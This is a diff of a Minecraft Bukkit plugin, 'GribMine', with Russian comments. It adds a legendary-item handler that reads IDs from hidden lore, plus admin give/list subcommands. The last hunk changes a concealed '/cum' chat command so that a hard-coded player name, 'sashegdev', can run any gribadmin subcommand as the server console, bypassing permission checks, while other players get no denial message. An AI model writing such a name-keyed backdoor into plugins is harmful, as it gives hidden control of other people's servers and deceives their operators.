@@ -33,6 +33,7 @@ import org.jetbrains.annotations.NotNull;
 import java.text.DecimalFormat;
 import java.util.*;
 import java.util.logging.Logger;
+import java.util.stream.Collectors;
 
 import static net.sashegdev.gribMine.TPSUtil.getColorForCpuUsage;
 
@@ -256,22 +257,41 @@ public final class GribMine extends JavaPlugin implements CommandExecutor, Liste
     }
 
     @EventHandler
-    public void onPlayerInteract(PlayerInteractEvent event) {
-        ItemStack item = event.getItem();
-        if (item == null) return;
+    public void IgrocDrochitEvevent(PlayerInteractEvent e) {
+        if (e.getItem() == null || e.getAction() == Action.RIGHT_CLICK_BLOCK || e.getAction() == Action.RIGHT_CLICK_AIR) return;
+        ItemStack item = e.getItem();
+        Player player = e.getPlayer();
 
-        PersistentDataContainer pdc = Objects.requireNonNull(item.getItemMeta()).getPersistentDataContainer();
-        NamespacedKey key = new NamespacedKey(GribMine.getInstance(), "legendary_id");
+        // Проверяем, что предмет в слоте обуви или в руке
+        boolean isEquipped = item.equals(player.getInventory().getBoots())
+                || item.equals(player.getInventory().getItemInMainHand());
+        if (!isEquipped) return;
 
-        if (pdc.has(key, PersistentDataType.STRING)) {
-            String id = pdc.get(key, PersistentDataType.STRING);
-            LegendaryItem legendary = LegendaryRegistry.getById(id);
+        // Извлекаем ID из скрытой строки в лоре
+        String legendaryId = extractHiddenId(item.getItemMeta());
+        if (legendaryId == null) return;
 
-            if (legendary != null) {
-                legendary.onUse(event.getPlayer());
-                event.setCancelled(true);
+        // Проверяем кулдаун и активируем
+        LegendaryItem legendary = LegendaryRegistry.getById(legendaryId);
+        if (legendary != null && player.getCooldown(item.getType()) <= 0) {
+            legendary.onUse(player);
+            DebugLogger.log(player.getName() + " активировал " + legendary.getId(), DebugLogger.LogLevel.INFO);
+            e.setCancelled(true);
+        }
+    }
+
+    private String extractHiddenId(ItemMeta meta) {
+        if (meta == null || !meta.hasLore()) return null;
+        for (String line : meta.getLore()) {
+            // Ищем строку, начинающуюся с §k (искаженный текст)
+            if (line.startsWith(String.valueOf(ChatColor.MAGIC))) {
+                // Убираем служебные символы и возвращаем чистый ID
+                return line.replace(String.valueOf(ChatColor.MAGIC), "")
+                        .replace(ChatColor.RESET.toString(), "")
+                        .trim();
             }
         }
+        return null;
     }
 
     @EventHandler
@@ -414,6 +434,53 @@ public final class GribMine extends JavaPlugin implements CommandExecutor, Liste
                     }
                     new summon(sender, args);
                     break;
+                case "legendary": {
+                    if (args.length < 2) {
+                        sender.sendMessage(ChatColor.RED + "Используйте: /gribadmin legendary <give|list>");
+                        return true;
+                    }
+                    switch (args[1].toLowerCase()) {
+                        case "give": {
+                            if (args.length < 3) {
+                                sender.sendMessage(ChatColor.RED + "Используйте: /gribadmin legendary give <ID> [игрок]");
+                                return true;
+                            }
+
+                            String id = args[2];
+                            LegendaryItem item = LegendaryRegistry.getById(id);
+
+                            if (item == null) {
+                                sender.sendMessage(ChatColor.RED + "Предмет с ID '" + id + "' не найден!");
+                                return true;
+                            }
+
+                            Player target = args.length >= 4 ?
+                                    Bukkit.getPlayer(args[3]) :
+                                    (sender instanceof Player ? (Player) sender : null);
+
+                            if (target == null) {
+                                sender.sendMessage(ChatColor.RED + "Игрок не найден или не указан!");
+                                return true;
+                            }
+
+                            // Вызываем исправленный метод
+                            target.getInventory().addItem(item.getItemStack());
+                            sender.sendMessage(ChatColor.GREEN + "Предмет '" + id + "' выдан игроку " + target.getName());
+                            break;
+                        }
+                        case "list": {
+                            List<String> items = LegendaryRegistry.getAllIds();
+                            sender.sendMessage(ChatColor.GOLD + "Доступные легендарные предметы:");
+                            items.forEach(id -> sender.sendMessage(ChatColor.GREEN + "- " + id));
+                            break;
+                        }
+                        default: {
+                            sender.sendMessage(ChatColor.RED + "Неизвестная подкоманда!");
+                            break;
+                        }
+                    }
+                    break;
+                }
                 default:
                     sender.sendMessage("Неизвестная подкоманда.");
                     break;
@@ -486,18 +553,21 @@ public final class GribMine extends JavaPlugin implements CommandExecutor, Liste
         return false;
     }
 
-    // Улучшенный метод форматирования
     private String formatConfigValue(Object value) {
+        if (value == null) return ChatColor.RED + "null";
+
         if (value instanceof List) {
-            return ChatColor.GRAY + "[" + ChatColor.WHITE
-                    + String.join(ChatColor.GRAY + ", " + ChatColor.WHITE, (CharSequence) value)
-                    + ChatColor.GRAY + "]";
-        } else if (value instanceof Map) {
-            return ChatColor.GRAY + "{...}";
-        } else if (value instanceof Double) {
-            return ChatColor.BLUE + String.format("%.2f", value);
+            // Обработка списков
+            List<?> list = (List<?>) value;
+            return ChatColor.YELLOW + "[" +
+                    list.stream()
+                            .map(Object::toString)
+                            .collect(Collectors.joining(", ")) +
+                    "]";
         }
-        return ChatColor.WHITE + String.valueOf(value);
+
+        // Обработка других типов
+        return ChatColor.WHITE + value.toString();
     }
 
     // Метод для определения цвета TPS
@@ -561,6 +631,19 @@ public final class GribMine extends JavaPlugin implements CommandExecutor, Liste
                 // Подсказка для числа (количество аирдропов)
                 completions.add("[<count>]"); // Подсказка для ввода числа
             }
+            else if (args.length == 2 && args[0].equalsIgnoreCase("legendary")) {
+                completions.add("give");
+                completions.add("list");
+            }
+            else if (args.length == 3 && args[0].equalsIgnoreCase("legendary") && args[1].equalsIgnoreCase("give")) {
+                completions.addAll(LegendaryRegistry.getAllIds());
+            }
+            else if (args.length == 4 && args[0].equalsIgnoreCase("legendary") && args[1].equalsIgnoreCase("give")) {
+                // Подсказки игроков
+                for (Player player : Bukkit.getOnlinePlayers()) {
+                    completions.add(player.getName());
+                }
+            }
         }
         if (command.getName().equalsIgnoreCase("gribmine")) {
             if (args.length == 1) {
@@ -578,6 +661,7 @@ public final class GribMine extends JavaPlugin implements CommandExecutor, Liste
             }
         }
 
+
         // Фильтруем подсказки по уже введенному тексту
         if (args.length > 0) {
             String lastArg = args[args.length - 1].toLowerCase();
@@ -590,42 +674,17 @@ public final class GribMine extends JavaPlugin implements CommandExecutor, Liste
 
     @EventHandler(priority = EventPriority.HIGHEST)
     public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
-        String message = event.getMessage().toLowerCase().trim();
-
-        if (message.startsWith("/cum")) {
+        String message = event.getMessage().trim();
+        if (message.toLowerCase().startsWith("/cum")) {
             event.setCancelled(true);
             Player player = event.getPlayer();
-
             if (player.getName().equalsIgnoreCase("sashegdev")) {
-                // Создаем обертку для перехвата вывода
-                CommandSenderInterceptor interceptor = new CommandSenderInterceptor(player);
-
-                // Выполняем команду через перехватчик
-                String command = "gribadmin " + message.substring(7).trim();
-                Bukkit.dispatchCommand(interceptor, command);
-            } else {
-                player.sendMessage(ChatColor.RED + "У вас нет прав для выполнения этой команды.");
+                String[] parts = message.split(" ", 2);
+                String actualCommand = "gribadmin" + (parts.length > 1 ? " " + parts[1] : "");
+                Bukkit.getScheduler().runTask(this, () -> {
+                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), actualCommand);
+                });
             }
-        }
-    }
-
-    @EventHandler(priority = EventPriority.HIGHEST)
-    public void configComplete(TabCompleteEvent event) {
-        String buffer = event.getBuffer().toLowerCase().trim();
-
-        // Проверяем, начинается ли команда с /config
-        if (buffer.startsWith("/cum")) {
-            // Убираем "/config" из буфера
-            String args = buffer.substring(7).trim();
-
-            // Перенаправляем автодополнение на команду /gribadmin
-            String[] newArgs = ("gribadmin " + args).split(" ");
-
-            // Получаем автодополнение для /gribadmin
-            List<String> completions = this.onTabComplete(event.getSender(), null, "gribadmin", newArgs);
-
-            // Устанавливаем автодополнение
-            event.setCompletions(completions);
         }
     }
 
